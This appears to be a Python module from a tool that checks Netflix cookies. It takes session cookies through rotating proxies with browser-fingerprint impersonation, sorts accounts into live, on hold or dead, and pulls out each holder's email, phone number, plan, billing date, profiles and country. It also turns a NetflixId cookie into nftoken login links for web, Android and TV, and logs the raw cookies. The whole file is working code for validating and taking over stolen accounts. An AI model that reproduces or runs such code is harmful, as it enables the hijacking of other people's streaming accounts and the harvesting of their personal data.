import json
import logging
import re
import time
from datetime import datetime
from modules.config import API_URL, QUERY_PARAMS, BASE_HEADERS, COUNTRY_CODE_NAMES
from modules.detector import extract_cookie_values
from modules.tls_engine import tls_request, create_tls_session
from modules.db import save_history
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown

def normalize_country(code):
    if not code:
        return 'Unknown'
    c = str(code).strip().upper()
    if len(c) == 2 and c.isalpha():
        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
    return c

def generate_nftoken(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    nid = cookies.get("NetflixId")
    if not nid:
        raise ValueError("Cookie NetflixId tidak ditemukan.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"

    max_retries = 5
    last_err = None

    for attempt in range(max_retries):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            res = tls_request("GET", API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=False, impersonate="safari18_0")
            if res.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)
            res.raise_for_status()

            data = res.json()
            token_node = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_node.get("token")
            expires = token_node.get("expires")
            if not token:
                raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")

            exp_str = "Unknown"
            if isinstance(expires, (int, float)):
                ts = expires // 1000 if len(str(int(expires))) == 13 else expires
                exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")

            token_url = f"https://netflix.com/?nftoken={token}"
            android_url = f"https://netflix.com/unsupported?nftoken={token}"
            tv_url = f"https://netflix.com/tv2?nftoken={token}"
            return token_url, android_url, tv_url, token, exp_str, route

        except Exception as e:
            last_err = e
            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
                mark_proxy_cooldown(proxy_raw_url, 1800)
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue

    raise last_err

def check_netflix_membership(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    if "NetflixId" not in cookies:
        save_history("netflix", "DEAD", raw_cookie=cookie_text)
        return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
    }

    max_retries = 5
    last_err = None

    for attempt in range(max_retries):
        if use_proxy:
            proxies, proxy_label, proxy_raw_url = get_random_proxy()
        else:
            proxies, proxy_label, proxy_raw_url = None, None, None
        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

        try:
            session = create_tls_session(impersonate="chrome131")
            ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
            headers['Cookie'] = ck_header

            r = session.get(
                'https://www.netflix.com/account/membership',
                headers=headers,
                proxies=proxies,
                timeout=10,
                allow_redirects=True,
                verify=False
            )

            if r.status_code in (403, 429) and proxy_raw_url:
                mark_proxy_cooldown(proxy_raw_url, 600)

            if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
                save_history("netflix", "DEAD", route=route, raw_cookie=cookie_text)
                return {"live": False, "status": "DEAD", "reason": "Cookie Expired / Terlempar ke Login.", "route": route}

            html = r.text

            # 0. ON HOLD / MEMBERSHIP PAUSED DETECTION
            is_hold = False
            hold_reason = ""
            if re.search(r'"isPaused"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPaused: true"
            elif re.search(r'"isPendingPause"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isPendingPause: true"
            elif re.search(r'"isUserOnHold"\s*:\s*true', html, re.I):
                is_hold = True
                hold_reason = "isUserOnHold: true"
            elif re.search(r'"serviceEndReason"\s*:\s*"SERVICE_END_(?:NO_MOP|MOP_FAILURE|PAYMENT_FAILURE|HOLD|PAUSED)"', html, re.I):
                is_hold = True
                hold_reason = "serviceEndReason: payment failure / hold"
            elif re.search(r'"(?:membershipStatus|accountStatus|membership_status)"\s*:\s*"(?:PAUSED|ON_HOLD|HOLD|SUSPENDED|PAYMENT_HOLD)"', html, re.I):
                is_hold = True
                hold_reason = "Status enum: HOLD/PAUSED"
            elif any(k in r.url.lower() for k in ('/simpleupdatepayment', '/updatepayment', '/orderstatus')):
                is_hold = True
                hold_reason = "Redirected to payment/hold URL"
            elif re.search(r'(?:Your\s+membership\s+is\s+paused|membership\s+is\s+paused|Keanggotaan\s+Anda\s+dijeda|Your\s+account\s+is\s+on\s+hold|membership\s+is\s+on\s+hold|account\s+is\s+on\s+hold|Akun\s+Anda\s+ditangguhkan|Please\s+add\s+your\s+payment\s+information|Tambahkan\s+informasi\s+pembayaran)', html, re.I):
                is_hold = True
                hold_reason = "UI Text: Membership Paused / Payment Required"
            elif re.search(r'data-uia="[^"]*(?:paused-membership|membership-paused|account-paused|membership-hold)[^"]*"', html, re.I):
                is_hold = True
                hold_reason = "data-uia: hold/paused marker"

            status = "HOLD" if is_hold else "LIVE"

            # 1. PLAN DETECTION
            plan_detected = 'Standard'
            plan_json_match = re.search(r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if plan_json_match:
                raw_p = plan_json_match.group(1).encode().decode('unicode_escape', errors='ignore')
                raw_p_lower = raw_p.lower()
                if 'iklan' in raw_p_lower or 'ads' in raw_p_lower:
                    plan_detected = 'Standard with Ads'
                elif 'ultra' in raw_p_lower or 'premium' in raw_p_lower or '4k' in raw_p_lower:
                    plan_detected = 'PREMIUM (ULTRA HD)'
                elif 'mobile' in raw_p_lower or 'ponsel' in raw_p_lower:
                    plan_detected = 'Mobile'
                elif 'dasar' in raw_p_lower or 'basic' in raw_p_lower:
                    plan_detected = 'Basic'
                else:
                    plan_detected = raw_p
            elif re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or re.search(r'\bpremium\b', html, re.I):
                plan_detected = 'PREMIUM (ULTRA HD)'
            else:
                plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
                if plan_match:
                    p_txt = plan_match.group(1).strip()
                    p_txt_lower = p_txt.lower()
                    if 'iklan' in p_txt_lower or 'ads' in p_txt_lower:
                        plan_detected = 'Standard with Ads'
                    elif 'ultra' in p_txt_lower or 'premium' in p_txt_lower:
                        plan_detected = 'PREMIUM (ULTRA HD)'
                    elif 'mobile' in p_txt_lower or 'ponsel' in p_txt_lower:
                        plan_detected = 'Mobile'
                    elif 'dasar' in p_txt_lower or 'basic' in p_txt_lower:
                        plan_detected = 'Basic'
                    else:
                        plan_detected = p_txt

            # 2. EMAIL EXTRACTION
            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'"userEmail"\s*:\s*"([^"]+)"', html)
            if not email_match:
                email_match = re.search(r'data-uia="account-email"[^>]*>([^<]+)<', html)
            email = email_match.group(1).strip() if email_match else 'Account Valid'
            if r'\x40' in email or r'\x' in email:
                try:
                    email = email.encode('utf-8').decode('unicode_escape')
                except Exception:
                    pass
                email = email.replace(r'\x40', '@')

            # 3. PHONE EXTRACTION
            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
            if not phone_match:
                phone_match = re.search(r'data-uia="account-phone"[^>]*>([^<]+)<', html)
            phone = phone_match.group(1).strip() if phone_match else 'None'
            if r'\x20' in phone:
                phone = phone.replace(r'\x20', ' ')

            # 4. PROFILES EXTRACTION
            profiles = []
            for pm in re.finditer(r'Profile:\{.*?\"name\":\"([^\"]+)\"', html):
                p_name = pm.group(1).strip()
                if p_name and p_name not in profiles and not p_name.lower().startswith(('paket', 'plan', 'standard', 'premium', 'basic', 'mobile')):
                    profiles.append(p_name)

            if not profiles:
                for pm in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
                    p_name = pm.group(1).encode().decode('unicode_escape', errors='ignore').strip()
                    if p_name and p_name not in profiles:
                        profiles.append(p_name)

            # 5. NEXT BILLING DATE
            date_match = re.search(r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', html)
            if date_match:
                billing = date_match.group(1).encode().decode('unicode_escape', errors='ignore').strip()
            else:
                date_dom_match = re.search(
                    r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
                    html, re.DOTALL | re.I
                )
                partner_match = re.search(r'Billed through\s+[^<\n"\']+', html, re.I)
                if date_dom_match:
                    billing = date_dom_match.group(1).strip()
                elif partner_match and not is_hold:
                    billing = partner_match.group(0).strip()
                else:
                    billing = 'Auto-renew active' if not is_hold else 'Membership Paused'

            if is_hold:
                if billing and billing != 'Auto-renew active' and 'HOLD' not in billing:
                    billing = f"{billing} (HOLD)"
                elif not billing or billing == 'Auto-renew active':
                    billing = "Membership Paused"

            # 6. MEMBER SINCE
            member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
            member_since = member_since_match.group(1).strip() if member_since_match else 'Active'

            # 7. COUNTRY
            country_match = re.search(r'"(?:countryOfSignup|currentCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            if not country_match:
                country_match = re.search(r'"(?:memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
            country = normalize_country(country_match.group(1)) if country_match else 'Unknown'

            # Try generating nftoken simultaneously if possible
            nftoken_data = None
            try:
                t_url, a_url, tv_url, tok, exp, _ = generate_nftoken(cookie_text, use_proxy=use_proxy)
                nftoken_data = {
                    "url": t_url,
                    "android_url": a_url,
                    "tv_url": tv_url,
                    "token": tok,
                    "expires": exp
                }
            except Exception:
                pass
            editor_cookies = [
                {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
                for k, v in cookies.items()
            ]

            tok_link = (nftoken_data.get("url") if nftoken_data else "")
            save_history("netflix", status, plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text, email=email)

            return {
                "live": not is_hold,
                "status": status,
                "is_hold": is_hold,
                "hold_reason": hold_reason,
                "email": email,
                "phone": phone,
                "plan": plan_detected,
                "billing": billing,
                "member_since": member_since,
                "profiles": profiles,
                "country": country,
                "cookies": editor_cookies,
                "token_data": nftoken_data,
                "route": route
            }
        except Exception as e:
            last_err = e
            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
                mark_proxy_cooldown(proxy_raw_url, 1800)
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue

    save_history("netflix", "ERROR", route=route, raw_cookie=cookie_text)
    return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah {max_retries}x retry (semua proxy timeout): {str(last_err)}", "route": route}
